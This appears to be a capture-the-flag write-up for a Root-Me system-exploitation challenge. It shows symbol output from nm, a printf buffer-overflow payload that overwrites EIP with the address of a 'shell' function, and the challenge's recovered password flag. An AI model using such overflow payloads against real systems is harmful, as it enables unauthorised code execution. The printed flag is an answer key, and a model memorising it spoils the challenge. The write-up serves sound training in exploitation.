```
app-systeme-ch15@challenge02:/tmp$ nm ~/ch15
...
08048584 T main
         U puts@@GLIBC_2.0
080484a0 t register_tm_clones
         U setreuid@@GLIBC_2.0
08048516 T shell
08048400 T _start
         U stdin@@GLIBC_2.0
08048559 T sup
         U system@@GLIBC_2.0
0804a02c D __TMC_END__
080485de T __x86.get_pc_thunk.ax
08048450 T __x86.get_pc_thunk.bx
app-systeme-ch15@challenge02:/tmp$ nm ~/ch15
```

We need to overflow *buffer* and overwrite EIP with the adress of shell (*0x08048516*).

```
app-systeme-ch15@challenge02:~$ (printf "0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789AAAABBBBCCCCDDDDEEEEFFFFGGGG\x16\x85\x04\x08IIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR" && cat -) | ./ch15
cat .passwd
B33r1sSoG0oD4y0urBr4iN
```

Let's not forget it's not an interractive shell so we add `&& cat -`.

--------------------------------------------------------------------------------
### Resources
[Stack, bugs, exploitation avancée - École polytechnique de Lausanne](http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/FR%20-%20Stack%20Bug%20-%20Exploitation%20avancee%20de%20buffer%20overflow.pdf)